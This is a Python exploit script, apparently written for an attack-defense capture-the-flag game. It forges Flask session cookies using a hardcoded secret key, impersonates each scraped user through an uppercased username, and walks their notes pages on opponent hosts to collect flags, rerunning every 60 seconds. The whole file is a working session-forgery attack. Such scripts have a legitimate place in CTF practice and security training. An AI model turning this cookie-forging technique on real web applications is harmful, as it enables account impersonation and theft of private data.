import subprocess
import os
import urllib.parse
import requests
from bs4 import BeautifulSoup

from scrape_users import get_user_list
from flag_utils import check_flag
from exploit_runtime import exp_runtime


def encode_cookie(secret_key, session_data):
    utility = "./flask_session_cookie_manager.py"
    session_data = str(session_data)
    cookie = subprocess.check_output([utility, "encode", "-s", secret_key, "-t", session_data])
    return cookie.decode().strip()


def exploit(opponent_ip):
    base_url = f"http://{opponent_ip}:7331/"
    secret_key = "shinigami"
    users = get_user_list(base_url)
    flags = set()
    for username in users:
        session_data = {"username": username.upper()}
        cookie = encode_cookie(secret_key, session_data)
        req_cookies = {"session": cookie}
        error, note_id = False, 0
        while not error:
            url = urllib.parse.urljoin(base_url, f"/notes/{username}/{note_id}")
            res = requests.get(url, cookies=req_cookies)
            soup = BeautifulSoup(res.text, 'html.parser')
            try:
                content = soup.find_all('p')[0].text
                new_flags = set(check_flag(content))
                flags = flags.union(new_flags)
                note_id += 1
            except IndexError:
                error = True
    return flags


if __name__ == "__main__":
    os.system("chmod +x flask_session_cookie_manager.py")
    opponents = ["127.0.0.1"]
    exp_runtime(exploit, opponents, sleep_time=60)
